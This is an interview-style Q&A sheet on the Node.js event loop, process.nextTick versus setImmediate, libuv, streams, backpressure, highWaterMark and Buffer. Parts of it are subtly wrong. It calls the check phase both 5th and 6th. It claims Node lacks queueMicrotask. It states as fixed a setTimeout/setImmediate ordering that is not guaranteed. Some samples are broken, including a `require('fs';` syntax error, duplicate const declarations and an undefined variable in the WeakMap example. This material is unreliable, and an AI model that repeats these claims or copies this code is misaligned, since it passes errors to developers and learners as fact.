# Node.js Event Loop & Execution - Questions & Answers

## 1. What is event loop? What are the phases of event loop in detail?

**Answer:**
The Event Loop is the core mechanism in Node.js that allows it to perform non-blocking I/O operations. It continuously checks for tasks to execute and processes them in a specific order.

**Phases of Event Loop (in order):**

1. **Timers Phase**: Executes callbacks scheduled by `setTimeout()` and `setInterval()`
2. **Pending Callbacks**: Executes deferred I/O callbacks
3. **Idle, Prepare**: Internal Node.js phase (rarely relevant)
4. **Poll Phase**: Retrieves new I/O events; executes callbacks (except timers and close callbacks)
5. **Check Phase**: Executes callbacks scheduled by `setImmediate()`
6. **Close Callbacks**: Executes close event handlers (e.g., socket.destroy())

The event loop repeats until there are no more callbacks to execute.

---

## 2. What are the execution priorities of Event loop?

**Answer:**
Node.js maintains multiple queues with different priorities:

1. **Highest Priority**: Microtasks
   - `process.nextTick()` callbacks
   - Promise `.then()`, `.catch()`, `.finally()`
   
2. **High Priority**: Timers Queue
   - `setTimeout()`, `setInterval()`
   
3. **Medium Priority**: I/O Callbacks Queue
   - File system operations, network operations
   
4. **Low Priority**: `setImmediate()` Queue
   - Deferred execution in the check phase

**Execution Order:**
```
Microtasks → Timers → I/O Callbacks → setImmediate → Microtasks → ...
```

---

## 3. Is browser/client event loop different from Node event loop?

**Answer:**
Yes, there are significant differences:

| Aspect | Browser | Node.js |
|--------|---------|---------|
| **Phases** | Simple: Timers → Microtasks → Render | Complex: 6 phases as described above |
| **Render Phase** | Included after each task | Not included |
| **Priority** | Microtasks after each task | Microtasks between specific phases |
| **Use Case** | UI updates and interactions | Server-side I/O operations |
| **queueMicrotask()** | Yes | Use `process.nextTick()` for similar behavior |
| **Performance Focus** | Visual smoothness (60fps) | Throughput and non-blocking I/O |

---

## 4. What is libuv in Node.js? How does it work?

**Answer:**
**libuv** is a C library that provides the event loop implementation for Node.js. It abstracts asynchronous I/O operations across different operating systems (Windows, Linux, macOS).

**How it works:**

1. **Cross-platform Abstraction**: Provides a unified API for OS-specific I/O operations
2. **Event Loop Management**: Manages the event loop phases and callbacks
3. **Thread Pool**: Uses a thread pool (default 4 threads) for I/O operations
4. **Handle & Request System**: 
   - Handles: Long-lived objects (timers, sockets)
   - Requests: One-time operations (file I/O, DNS lookups)

**Architecture:**
```
JavaScript → Node.js Core → libuv → OS-specific syscalls
```

---

## 5. What is thread pool in Node.js? How does it work?

**Answer:**
The thread pool in libuv is a collection of worker threads used to handle blocking I/O operations asynchronously.

**Key Details:**

- **Default Size**: 4 threads (configurable via `UV_THREADPOOL_SIZE` environment variable)
- **Tasks Executed**: File system operations, DNS lookups, crypto operations, compression
- **How it Works**:
  1. JavaScript code calls async function (e.g., `fs.readFile()`)
  2. Task is queued to thread pool
  3. Available worker thread executes the blocking operation
  4. Once complete, callback is added to the I/O callback queue
  5. Event loop picks it up and executes the callback

**Example:**
```javascript
const fs = require('fs');

// Task goes to thread pool
fs.readFile('file.txt', (err, data) => {
  console.log(data); // Executes after thread pool completes
});
```

---

## 6. How to prevent blocking of event loop and monitor event loop for starvation?

**Answer:**

**Preventing Event Loop Blocking:**

1. **Use Async Operations**: Always use async APIs (callbacks, promises, async/await)
2. **Offload CPU-Heavy Tasks**: Use Worker Threads or Child Processes
3. **Break Long Operations**: Use `process.nextTick()` or `setImmediate()` to break computations
4. **Stream Large Data**: Use streams instead of loading entire files

**Example of preventing blocking:**
```javascript
// ❌ Blocking
for (let i = 0; i < 1e9; i++) { /* heavy computation */ }

// ✅ Non-blocking
function heavyComputation(i) {
  if (i < 1e9) {
    // Do work in chunks
    setImmediate(() => heavyComputation(i + 1));
  }
}
```

**Monitoring Event Loop Starvation:**

1. **Use `node --inspect`**: Chrome DevTools integration
2. **Use Monitoring Libraries**: 
   - `clinic.js` - Profiles bottlenecks
   - `0x` - Flame graph profiler
3. **Metrics to Monitor**:
   - Event loop lag/delay
   - Memory usage
   - CPU utilization

```javascript
// Simple event loop lag detection
const start = Date.now();
setImmediate(() => {
  const lag = Date.now() - start;
  console.log(`Event loop lag: ${lag}ms`);
});
```

---

## 7. What is process.nextTick() in detail?

**Answer:**
`process.nextTick()` schedules a callback to be executed immediately after the current phase completes, but before the event loop moves to the next phase.

**Key Characteristics:**

- **Execution Priority**: Highest - runs before any I/O events
- **Queue**: Separate queue (not in the event loop phases)
- **Use Case**: Ensure code executes after current operation completes but before I/O

**Example:**
```javascript
console.log('1');

process.nextTick(() => {
  console.log('2');
});

console.log('3');

// Output: 1, 3, 2
```

**Behavior with Multiple Calls:**
```javascript
process.nextTick(() => console.log('A'));
process.nextTick(() => console.log('B'));

// Output: A, B (entire queue drains before moving to next phase)
```

---

## 8. What is setImmediate()?

**Answer:**
`setImmediate()` schedules a callback to be executed in the **check phase** of the event loop, which occurs after the poll phase.

**Key Characteristics:**

- **Execution Phase**: Check phase (6th phase of event loop)
- **Priority**: Lower than timers but independent of I/O
- **Use Case**: Defer execution to after I/O events are processed

**Example:**
```javascript
setImmediate(() => {
  console.log('setImmediate');
});

setTimeout(() => {
  console.log('setTimeout');
}, 0);

// Output: setTimeout, setImmediate (timers phase comes before check phase)
```

**Difference from process.nextTick():**
```javascript
process.nextTick(() => console.log('nextTick'));
setImmediate(() => console.log('setImmediate'));

// Output: nextTick, setImmediate (nextTick is processed before setImmediate)
```

---

## 9. What are the different types of queues in Node.js, and what is its execution priority?

**Answer:**
Node.js maintains multiple queues with specific execution priorities:

**Queue Types (in execution order):**

1. **nextTick Queue** (Process.nextTick callbacks)
   - Priority: **Highest**
   - Executes: Between every phase and microtasks

2. **Microtask Queue** (Promises, async/await)
   - Priority: **Very High**
   - Executes: After every task, before next phase

3. **Timer Queue** (setTimeout, setInterval)
   - Priority: **High**
   - Phase: Timers phase

4. **I/O Callback Queue** (File system, network operations)
   - Priority: **Medium**
   - Phase: Poll phase

5. **setImmediate Queue**
   - Priority: **Low**
   - Phase: Check phase

**Execution Flow:**
```
nextTick Queue → Microtask Queue → Timer Queue → I/O Queue → setImmediate Queue
→ (repeat from nextTick Queue)
```

---

## 10. Where do process.nextTick() and setImmediate() fit inside the event loop?

**Answer:**

**process.nextTick() Placement:**
- Executes **between every phase** of the event loop
- Runs **after** the current JavaScript execution context
- Before the event loop moves to the **next phase**
- Can starve the event loop if too many nextTick callbacks are scheduled

**setImmediate() Placement:**
- Executes in the **Check Phase** (6th phase)
- After I/O callbacks (Poll phase) are processed
- Before the next iteration begins

**Visual Representation:**
```
┌─────────────────────────────────┐
│         Current Phase           │
└─────────────────────────────────┘
          ↓
    [process.nextTick Queue]    ← Drains entirely
    [Microtask Queue]           ← Drains entirely
          ↓
┌─────────────────────────────────┐
│         Timers Phase            │
└─────────────────────────────────┘
          ↓
    [process.nextTick Queue]    ← Drains entirely
    [Microtask Queue]           ← Drains entirely
          ↓
┌─────────────────────────────────┐
│    Poll Phase (I/O Callbacks)   │
└─────────────────────────────────┘
          ↓
    [process.nextTick Queue]    ← Drains entirely
    [Microtask Queue]           ← Drains entirely
          ↓
┌─────────────────────────────────┐
│   Check Phase (setImmediate)    │ ← setImmediate executes here
└─────────────────────────────────┘
```

**Example Demonstrating Order:**
```javascript
setTimeout(() => console.log('setTimeout'), 0);
setImmediate(() => console.log('setImmediate'));
process.nextTick(() => console.log('nextTick'));
Promise.resolve().then(() => console.log('Promise'));

// Output:
// nextTick
// Promise
// setTimeout
// setImmediate
```

---

## 11. setImmediate vs setTimeout — which is better?

**Answer:**

**setTimeout():**
- Executes in the **Timers Phase**
- Scheduled with a minimum delay (typically 1-4ms due to OS limitations)
- Better for: Scheduling operations after a specific time delay

**setImmediate():**
- Executes in the **Check Phase** (after I/O)
- No delay; executes as soon as possible after current phase
- Better for: Deferring execution to allow I/O events to be processed

**Comparison Table:**

| Aspect | setTimeout | setImmediate |
|--------|-----------|--------------|
| **Phase** | Timers | Check |
| **Delay** | Minimum 1ms | No delay |
| **I/O Processing** | Before I/O callbacks | After I/O callbacks |
| **Use Case** | Time-based scheduling | Deferred execution |
| **Performance** | Slight overhead | Lighter |

**When to Use:**

```javascript
// Use setImmediate for general deferral
setImmediate(() => {
  console.log('Deferred execution');
});

// Use setTimeout for actual time delays
setTimeout(() => {
  console.log('Executes after 1000ms');
}, 1000);

// In I/O operations, setImmediate is better
fs.readFile('file.txt', (err, data) => {
  setImmediate(() => {
    console.log('Process after I/O');
  });
});
```

**Performance Impact:**
- `setImmediate()` is generally faster and more efficient for non-time-based deferral
- `setTimeout()` adds extra overhead due to timer management
- In loops with many iterations, `setImmediate()` causes less memory pressure

---

## 12. Why is process.nextTick() dangerous?

**Answer:**

**Risks of process.nextTick():**

1. **Event Loop Starvation**: If you recursively call `process.nextTick()`, it can block the event loop from processing other phases

2. **Unpredictable Behavior**: The nextTick queue drains entirely before moving to the next phase, causing unexpected delays

3. **Memory Issues**: Large numbers of nextTick callbacks can consume memory without yielding to other operations

4. **Microtask Queue Starvation**: Similar issues apply when combining with Promises

**Dangerous Example - Starvation:**
```javascript
// ❌ Dangerous - Starves the event loop
function dangerousRecursion(n) {
  if (n > 0) {
    process.nextTick(() => {
      console.log(n);
      dangerousRecursion(n - 1);
    });
  }
}

dangerousRecursion(1000); // Can block event loop

// I/O operations will be delayed!
fs.readFile('file.txt', () => {
  console.log('This will be delayed significantly');
});
```

**Dangerous Example - Mixing with Promises:**
```javascript
// ❌ Both process.nextTick and Promises drain before moving to next phase
process.nextTick(() => {
  console.log('nextTick');
});

Promise.resolve().then(() => {
  console.log('Promise');
});

// If these recursively call themselves, they starve the event loop
```

**Safe Alternatives:**

```javascript
// ✅ Use setImmediate for potentially long operations
function safeRecursion(n) {
  if (n > 0) {
    setImmediate(() => {
      console.log(n);
      safeRecursion(n - 1);
    });
  }
}

safeRecursion(1000); // Allows other phases to execute

setTimeout(() => {
  console.log('Gets executed sooner than with nextTick');
}, 0);

fs.readFile('file.txt', () => {
  console.log('I/O is processed more regularly');
});
```

**When process.nextTick() is Safe:**
- Ensuring code runs after current phase but not recursively
- One-time deferrals, not loops
- Error handling and cleanup

---

## 13. Which one can cause starvation fastest — process.nextTick() or setImmediate()?

**Answer:**

**process.nextTick() causes starvation FASTEST.**

**Why:**

1. **Execution Priority**: process.nextTick executes between every phase
2. **Queue Draining**: The entire nextTick queue drains before moving to the next phase
3. **I/O Blocking**: Other phases (I/O, timers) cannot execute until nextTick queue is empty
4. **setImmediate** at least allows other phases to run after the check phase

**Starvation Speed Comparison:**

```javascript
// process.nextTick causes IMMEDIATE starvation
console.log('Start');

// Fill nextTick queue with recursive calls
function nextTickStarvation(n) {
  if (n > 0) {
    process.nextTick(() => {
      nextTickStarvation(n - 1);
    });
  }
}

// This will block I/O almost immediately
nextTickStarvation(10000);

// setTimeout will be significantly delayed
setTimeout(() => {
  console.log('This is starved - nextTick has full priority');
}, 0);

// File I/O will be blocked
fs.readFile('file.txt', () => {
  console.log('This is also starved');
});
```

**setImmediate is Safer:**

```javascript
// setImmediate allows phases to execute
function setImmediateRecursion(n) {
  if (n > 0) {
    setImmediate(() => {
      setImmediateRecursion(n - 1);
    });
  }
}

setImmediateRecursion(10000); // Allows other phases to run

setTimeout(() => {
  console.log('Gets executed sooner than with nextTick');
}, 0);

fs.readFile('file.txt', () => {
  console.log('I/O is processed more regularly');
});
```

**Event Loop Execution:**

```
process.nextTick starvation:
Phase 1 → [nextTick queue fills completely] → Eventually Phase 2 → ...

setImmediate recursion:
Phase 1 → Phase 2 → Phase 3 → Check Phase [one setImmediate] → Phase 1 → ...
```

**Conclusion:**
- **process.nextTick()** starves fastest and most severely
- **setImmediate()** allows periodic breaks for other phases

---

## 14. What are streams in Node.js?

**Answer:**

**Streams** are objects in Node.js that let you read and write data continuously in chunks, rather than loading entire data into memory at once.

**Key Characteristics:**

- **Memory Efficient**: Process data in chunks instead of all at once
- **Real-time Data**: Handle continuous data flow (e.g., file downloads, video streaming)
- **Event-driven**: Emit events as data is available

**Types of Streams:**

1. **Readable Streams**: Data can be read from them
   - Example: `fs.createReadStream()`, HTTP requests

2. **Writable Streams**: Data can be written to them
   - Example: `fs.createWriteStream()`, HTTP responses

3. **Duplex Streams**: Both readable and writable
   - Example: TCP sockets, `zlib.createDeflate()`

4. **Transform Streams**: Modify data as it passes through
   - Example: `zlib.createGzip()`, custom transformations

**Basic Example:**

```javascript
const fs = require('fs');

// Readable Stream
const readStream = fs.createReadStream('large-file.txt');

// Writable Stream
const writeStream = fs.createWriteStream('output.txt');

// Read data in chunks
readStream.on('data', (chunk) => {
  console.log(`Received ${chunk.length} bytes`);
  writeStream.write(chunk);
});

readStream.on('end', () => {
  console.log('No more data to read');
});
```

**Stream Methods:**

```javascript
// Readable
readable.read()
readable.pause()
readable.resume()

// Writable
writable.write(data)
writable.end()

// Both
stream.pipe(destination)
stream.on('data', handler)
stream.on('end', handler)
stream.on('error', handler)
```

**Advantages:**

- ✅ Handles large files without memory issues
- ✅ Real-time processing capability
- ✅ Better performance for large datasets
- ✅ Chainable via pipe

---

## 15. What is back pressure in streams? How to handle it?

**Answer:**

**Back Pressure** occurs when the writable stream cannot keep up with the speed of data from the readable stream, causing data to accumulate in memory (internal buffer).

**Why It Happens:**

```javascript
// ❌ Without backpressure handling
const readStream = fs.createReadStream('large-file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  // Write faster than it can be processed
  writeStream.write(chunk);
  // Data accumulates in writeStream's buffer
});
```

**Detecting Back Pressure:**

```javascript
const readStream = fs.createReadStream('large-file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  // write() returns false if buffer is full (back pressure)
  const canContinue = writeStream.write(chunk);
  
  if (!canContinue) {
    console.log('Back pressure detected!');
    readStream.pause(); // Stop reading
  }
});

// Resume when buffer is drained
writeStream.on('drain', () => {
  console.log('Buffer drained, resume reading');
  readStream.resume();
});
```

**Handling Back Pressure - Best Practice:**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('large-file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  const canContinue = writeStream.write(chunk);
  
  if (!canContinue) {
    readStream.pause(); // Pause the readable stream
  }
});

writeStream.on('drain', () => {
  readStream.resume(); // Resume when buffer is drained
});
```

**Automatic Handling with pipe():**

```javascript
// ✅ pipe() handles backpressure automatically!
const readStream = fs.createReadStream('large-file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.pipe(writeStream);

// No need to manually handle pause/resume
```

**Monitoring Back Pressure:**

```javascript
const readStream = fs.createReadStream('large-file.txt', {
  highWaterMark: 64 * 1024 // 64KB chunks
});
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  console.log(`Buffer size: ${writeStream.writableLength}`);
  
  const canContinue = writeStream.write(chunk);
  if (!canContinue) {
    console.log('Back pressure! Pausing...', {
      readable: readStream.readableLength,
      writable: writeStream.writableLength
    });
    readStream.pause();
  }
});

writeStream.on('drain', () => {
  console.log('Drain event - resuming');
  readStream.resume();
});
```

**Key Properties:**

- `writableLength`: Amount of data buffered in writable stream
- `readableLength`: Amount of data buffered in readable stream
- `highWaterMark`: Threshold that triggers back pressure warning

---

## 16. What is pipe() in Node.js?

**Answer:**

**pipe()** connects a readable stream to a writable stream, automatically handling data flow and back pressure.

**Syntax:**
```javascript
readableStream.pipe(writableStream);
```

**How pipe() Works:**

1. Reads data from source stream in chunks
2. Writes chunks to destination stream
3. Automatically handles back pressure (pause/resume)
4. Ends destination when source ends

**Basic Example:**

```javascript
const fs = require('fs';

// Copy a file using pipe
fs.createReadStream('source.txt')
  .pipe(fs.createWriteStream('destination.txt'));
```

**Chaining Multiple Streams:**

```javascript
const fs = require('fs');
const zlib = require('zlib');

// Read → Compress → Write
fs.createReadStream('input.txt')
  .pipe(zlib.createGzip())
  .pipe(fs.createWriteStream('input.txt.gz'));

console.log('File compressed!');
```

**Benefits of pipe():**

- ✅ Automatic back pressure handling
- ✅ Memory efficient
- ✅ Cleaner, readable code
- ✅ Chainable for complex operations

**Error Handling with pipe():**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('source.txt');
const writeStream = fs.createWriteStream('destination.txt');

readStream
  .pipe(writeStream)
  .on('error', (err) => {
    console.error('Write error:', err);
  });

readStream.on('error', (err) => {
  console.error('Read error:', err);
});
```

**Modern Alternative - pipeline():**

```javascript
const fs = require('fs');
const { pipeline } = require('stream');

// Better error handling across all streams
pipeline(
  fs.createReadStream('source.txt'),
  fs.createWriteStream('destination.txt'),
  (err) => {
    if (err) {
      console.error('Pipeline failed', err);
    } else {
      console.log('Pipeline succeeded');
    }
  }
);
```

**Comparison with Manual Approach:**

```javascript
// ❌ Manual - requires back pressure handling
const read = fs.createReadStream('source.txt');
const write = fs.createWriteStream('dest.txt');

read.on('data', (chunk) => {
  if (!write.write(chunk)) {
    read.pause();
  }
});

write.on('drain', () => {
  read.resume();
});

// ✅ With pipe() - automatic
read.pipe(write);
```

---

## 17. How can streams cause memory leaks and how to handle it?

**Answer:**

**Memory Leak Scenarios with Streams:**

**1. Not Ending Streams Properly:**

```javascript
// ❌ Memory leak - stream never ends
const fs = require('fs');

const readStream = fs.createReadStream('large-file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  writeStream.write(chunk);
  // If error occurs and pipe is not properly closed
});

// Missing proper cleanup - stream stays open
```

**2. Event Listeners Not Removed:**

```javascript
// ❌ Memory leak - listeners accumulate
function processFile() {
  const readStream = fs.createReadStream('file.txt');
  
  readStream.on('data', (chunk) => {
    console.log(chunk);
  });
  // Listeners not cleaned up if function is called multiple times
}

// Called in a loop - listeners accumulate
for (let i = 0; i < 1000; i++) {
  processFile(); // Memory leak!
}
```

**3. Piped Streams Not Cleaned Up:**

```javascript
// ❌ Memory leak - streams not properly closed on error
const fs = require('fs');

const readStream = fs.createReadStream('source.txt');
const writeStream = fs.createWriteStream('dest.txt');

readStream.pipe(writeStream);

writeStream.on('error', (err) => {
  console.error('Error:', err);
  // Streams not destroyed - memory leak
});
```

**4. Large Buffer Accumulation:**

```javascript
// ❌ Without back pressure handling
const readStream = fs.createReadStream('huge-file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  writeStream.write(chunk); // Ignoring return value
  // Buffer keeps growing without pause/resume
});
```

**Solutions:**

**1. Properly Close Streams:**

```javascript
// ✅ Proper cleanup
const fs = require('fs');

const readStream = fs.createReadStream('source.txt');
const writeStream = fs.createWriteStream('destination.txt');

readStream.on('error', (err) => {
  console.error('Read error:', err);
  writeStream.destroy(); // Clean up writable stream
});

writeStream.on('error', (err) => {
  console.error('Write error:', err);
  readStream.destroy(); // Clean up readable stream
});

readStream.on('end', () => {
  writeStream.end(); // Properly end the stream
});
```

**2. Use pipeline() for Automatic Cleanup:**

```javascript
// ✅ Best practice - handles cleanup automatically
const fs = require('fs');
const { pipeline } = require('stream');

pipeline(
  fs.createReadStream('source.txt'),
  fs.createWriteStream('destination.txt'),
  (err) => {
    if (err) {
      console.error('Pipeline error:', err);
    }
    // Streams are automatically destroyed on error or completion
  }
);
```

**3. Remove Event Listeners:**

```javascript
// ✅ Clean up listeners
function processFile() {
  const readStream = fs.createReadStream('file.txt');
  
  const dataHandler = (chunk) => {
    console.log(chunk);
  };
  
  readStream.on('data', dataHandler);
  
  readStream.on('end', () => {
    readStream.removeListener('data', dataHandler); // Remove listener
  });
}
```

**4. Handle Back Pressure:**

```javascript
// ✅ Back pressure handling prevents buffer overflow
const fs = require('fs');

const readStream = fs.createReadStream('file.txt');
const writeStream = fs.createWriteStream('output.txt');

readStream.on('data', (chunk) => {
  const canWrite = writeStream.write(chunk);
  
  if (!canWrite) {
    readStream.pause();
  }
});

writeStream.on('drain', () => {
  readStream.resume();
});
```

**5. Use destroy() in Error Cases:**

```javascript
// ✅ Explicit stream destruction
const fs = require('fs');

const readStream = fs.createReadStream('source.txt');
const writeStream = fs.createWriteStream('destination.txt');

readStream.pipe(writeStream);

process.on('uncaughtException', (err) => {
  console.error('Exception:', err);
  readStream.destroy(); // Destroy immediately
  writeStream.destroy();
});
```

**6. Weak References:**

```javascript
// ✅ Use WeakMap to prevent memory leaks
const cache = new WeakMap();

function cacheUser(user) {
  cache.set(user, userData);
  // Automatically deleted when user object is deleted
}
```

**Best Practices:**

- Monitor memory usage regularly
- Always clean up event listeners
- Always clear intervals/timeouts
- Avoid global variables
- Use local variables when possible
- Use WeakMaps for caches
- Implement proper cleanup methods
- Test for memory leaks during development

**Key Takeaway:**

- **Memory Leak** = Memory that's never released and keeps growing
- **Common Causes** = Unreleased intervals, event listeners, global variables, circular references
- **Prevention** = Always cleanup resources, use local variables, monitor memory
- **Detection** = Use Chrome DevTools or clinic.js

---

## 18. What kind of events are emitted by streams?

**Answer:**

**Common Stream Events:**

**Readable Stream Events:**

1. **'data'** - Emitted when data is available to read
2. **'end'** - Emitted when no more data will be provided
3. **'error'** - Emitted when an error occurs
4. **'pause'** - Emitted when stream is paused
5. **'resume'** - Emitted when stream resumes
6. **'close'** - Emitted when the stream is closed
7. **'readable'** - Emitted when data is available in buffer

**Writable Stream Events:**

1. **'drain'** - Emitted when buffer is empty (can write more)
2. **'finish'** - Emitted when all data has been written
3. **'error'** - Emitted when an error occurs
4. **'close'** - Emitted when the stream is closed
5. **'pipe'** - Emitted when a readable stream is piped into it
6. **'unpipe'** - Emitted when a pipe is removed

**Duplex/Transform Stream Events:**
- Combines both readable and writable stream events

**Examples:**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('file.txt');

// 'data' event - when chunk is available
readStream.on('data', (chunk) => {
  console.log(`Read ${chunk.length} bytes`);
});

// 'end' event - when stream ends
readStream.on('end', () => {
  console.log('No more data');
});

// 'error' event - when error occurs
readStream.on('error', (err) => {
  console.error('Read error:', err);
});

// 'close' event - when file descriptor is closed
readStream.on('close', () => {
  console.log('Stream closed');
});
```

**Writable Stream Events Example:**

```javascript
const writeStream = fs.createWriteStream('output.txt');

// 'drain' event - when buffer is empty
writeStream.on('drain', () => {
  console.log('Buffer drained, can write more');
});

// 'finish' event - when all data written and stream ended
writeStream.on('finish', () => {
  console.log('All data written');
});

// 'error' event
writeStream.on('error', (err) => {
  console.error('Write error:', err);
});

writeStream.write('Some data');
writeStream.end(); // Signals end of writing
```

**Full Stream Lifecycle Example:**

```javascript
const readStream = fs.createReadStream('source.txt');
const writeStream = fs.createWriteStream('dest.txt');

// Readable stream events
readStream.on('open', () => console.log('Read: file opened'));
readStream.on('data', () => console.log('Read: data available'));
readStream.on('pause', () => console.log('Read: paused'));
readStream.on('resume', () => console.log('Read: resumed'));
readStream.on('end', () => console.log('Read: ended'));
readStream.on('close', () => console.log('Read: closed'));
readStream.on('error', (err) => console.error('Read: error', err));

// Writable stream events
writeStream.on('open', () => console.log('Write: file opened'));
writeStream.on('drain', () => console.log('Write: drained'));
writeStream.on('pipe', () => console.log('Write: piped'));
writeStream.on('unpipe', () => console.log('Write: unpiped'));
writeStream.on('finish', () => console.log('Write: finished'));
writeStream.on('close', () => console.log('Write: closed'));
writeStream.on('error', (err) => console.error('Write: error', err));

readStream.pipe(writeStream);
```

---

## 19. What is flowing mode and pause mode in streams?

**Answer:**

**Two Modes of Readable Streams:**

**1. Flowing Mode:**
- Data is continuously read from source and emitted as 'data' events
- Data flows automatically without calling `read()`
- Can cause back pressure if not handled

**2. Paused Mode (Default):**
- Stream is paused by default
- Must explicitly call `read()` to get data
- Gives more control over data consumption

**Switching Between Modes:**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('file.txt');

// Enter flowing mode
readStream.on('data', (chunk) => {
  console.log('Flowing mode:', chunk);
});

// OR explicitly
readStream.resume(); // Enter flowing mode

// Exit flowing mode
readStream.pause(); // Back to paused mode
```

**Flowing Mode Example:**

```javascript
// ✅ Flowing mode
const readStream = fs.createReadStream('large-file.txt');

readStream.on('data', (chunk) => {
  console.log(`Read chunk: ${chunk.length} bytes`);
  // Data automatically flows
});

readStream.on('end', () => {
  console.log('Done reading');
});
```

**Paused Mode Example:**

```javascript
// ✅ Paused mode - manual control
const readStream = fs.createReadStream('file.txt');

readStream.on('readable', () => {
  let chunk;
  while ((chunk = readStream.read()) !== null) {
    console.log(`Read chunk: ${chunk.length} bytes`);
  }
});

readStream.on('end', () => {
  console.log('Done reading');
});
```

**Switching Modes:**

```javascript
const readStream = fs.createReadStream('file.txt');

// Start in paused mode (no listeners)
console.log(readStream.readableFlowing); // null (paused)

// Enter flowing mode
readStream.on('data', (chunk) => {
  console.log('Flowing:', chunk.length);
});
console.log(readStream.readableFlowing); // true

// Back to paused mode
readStream.pause();
console.log(readStream.readableFlowing); // false

// Resume flowing mode
readStream.resume();
console.log(readStream.readableFlowing); // true
```

**Practical Example - Back Pressure Handling:**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('file.txt');
const writeStream = fs.createWriteStream('output.txt');

// Enter flowing mode but control with pause/resume
readStream.on('data', (chunk) => {
  const canWrite = writeStream.write(chunk);
  
  if (!canWrite) {
    // Pause flowing mode - back pressure
    readStream.pause();
    console.log('Paused due to back pressure');
  }
});

writeStream.on('drain', () => {
  // Resume flowing mode
  readStream.resume();
  console.log('Resumed');
});
```

**Key Differences:**

| Aspect | Flowing Mode | Paused Mode |
|--------|--------------|------------|
| **Data Delivery** | Automatic via 'data' events | Manual via `read()` |
| **Default** | Not default | Default |
| **Entry** | Attach 'data' listener or `resume()` | `pause()` or no listeners |
| **Control** | Less control | More control |
| **Back Pressure** | Easy to cause | Easier to handle |
| **Use Case** | Simple piping | Complex processing |

---

## 20. What is highWaterMark?

**Answer:**

**highWaterMark** is a threshold (in bytes) that determines when back pressure should occur in streams.

**How It Works:**

- **Readable Streams**: When internal buffer reaches `highWaterMark`, `read()` stops reading from source
- **Writable Streams**: When internal buffer exceeds `highWaterMark`, `write()` returns `false` (back pressure signal)

**Default Values:**

```javascript
// Readable stream: 16KB (16384 bytes)
// Writable stream: 16KB
// But can be different for specific types
```

**Setting highWaterMark:**

```javascript
const fs = require('fs');

// Set 64KB highWaterMark
const readStream = fs.createReadStream('file.txt', {
  highWaterMark: 64 * 1024 // 64KB
});

const writeStream = fs.createWriteStream('output.txt', {
  highWaterMark: 32 * 1024 // 32KB
});
```

**Effect on Back Pressure:**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('large-file.txt', {
  highWaterMark: 16 * 1024 // 16KB
});

const writeStream = fs.createWriteStream('output.txt', {
  highWaterMark: 8 * 1024 // lower threshold
});

readStream.on('data', (chunk) => {
  console.log(`Buffered (write): ${writeStream.writableLength}`);
  
  const canContinue = writeStream.write(chunk);
  if (!canContinue) {
    console.log('Back pressure! Pausing...', {
      readable: readStream.readableLength,
      writable: writeStream.writableLength
    });
    readStream.pause();
  }
});

writeStream.on('drain', () => {
  console.log('Drain event - resuming');
  readStream.resume();
});
```

**Monitoring highWaterMark:**

```javascript
const fs = require('fs');

const readStream = fs.createReadStream('file.txt', {
  highWaterMark: 32 * 1024
});

const writeStream = fs.createWriteStream('output.txt', {
  highWaterMark: 16 * 1024
});

readStream.on('data', (chunk) => {
  console.log('Readable buffer:', {
    highWaterMark: readStream.readableHighWaterMark,
    length: readStream.readableLength
  });
  
  const canContinue = writeStream.write(chunk);
  
  console.log('Writable buffer:', {
    highWaterMark: writeStream.writableHighWaterMark,
    length: writeStream.writableLength,
    canContinue
  });
});
```

**Performance Implications:**

```javascript
// Small highWaterMark - More frequent back pressure signals
// Pros: Better memory control
// Cons: More pause/resume cycles

const readStream = fs.createReadStream('file.txt', {
  highWaterMark: 1024 // 1KB - very small
});

// Large highWaterMark - Less frequent back pressure
// Pros: Fewer pause/resume cycles
// Cons: Higher memory usage

const readStream = fs.createReadStream('file.txt', {
  highWaterMark: 1024 * 1024 // 1MB - very large
});
```

**Best Practices:**

```javascript
// Typical configuration
const readStream = fs.createReadStream('file.txt', {
  highWaterMark: 64 * 1024 // 64KB - good balance
});

const writeStream = fs.createWriteStream('output.txt', {
  highWaterMark: 64 * 1024
});

// For network streams (slower)
const { createServer } = require('http');

createServer((req, res) => {
  const readStream = fs.createReadStream('file.txt', {
    highWaterMark: 16 * 1024 // Smaller for network
  });
  
  readStream.pipe(res);
}).listen(3000);

// For fast local I/O
const readStream = fs.createReadStream('file.txt', {
  highWaterMark: 256 * 1024 // Larger for local I/O
});
```

**Key Takeaways:**

- `highWaterMark` controls when back pressure occurs
- Smaller values = more memory efficient but more pause/resume
- Larger values = better throughput but higher memory usage
- Default 16KB is suitable for most cases
- Adjust based on available memory and I/O speed

---

## 21. What is Buffer and why is it needed?

**Answer (Simple Explanation):**

**What is Buffer?**

Buffer is a built-in Node.js class that provides a way to work with binary data directly.

**Why is it needed?**

1. **Binary Data Handling**: Node.js uses Buffers to handle binary data (like images, files, etc.).
2. **Performance**: Buffers are more efficient for I/O operations than regular JavaScript strings.
3. **Interoperability**: Many Node.js APIs use Buffers to represent data.

**Real-Life Analogy:**

Imagine you're a chef:
- You receive ingredients (data) in bulk.
- You prepare them (chop, mix) before cooking.
- You don't cook directly with the bulk ingredients.

**In a similar way, Buffers:**
- Receive data in chunks
- Prepare (convert, manipulate) data before using it

**Basic Example:**

```javascript
// Create a buffer of 10 bytes
const buf = Buffer.alloc(10);
console.log(buf); // <Buffer 00 00 00 00 00 00 00 00 00 00>

// Create buffer from a string
const buf2 = Buffer.from('Hello');
console.log(buf2); // <Buffer 48 65 6c 6c 6f>

// Convert buffer back to string
console.log(buf2.toString()); // Output: Hello
```

**When is Buffer Used?**

- Reading files: `fs.readFile()` returns data as a Buffer
- Downloading from internet: Chunks come as Buffers
- Image/video processing: Data is in Buffer format
- Working with streams: Data flows as Buffers

**Key Points (Simple):**

- Buffer = Container for binary data
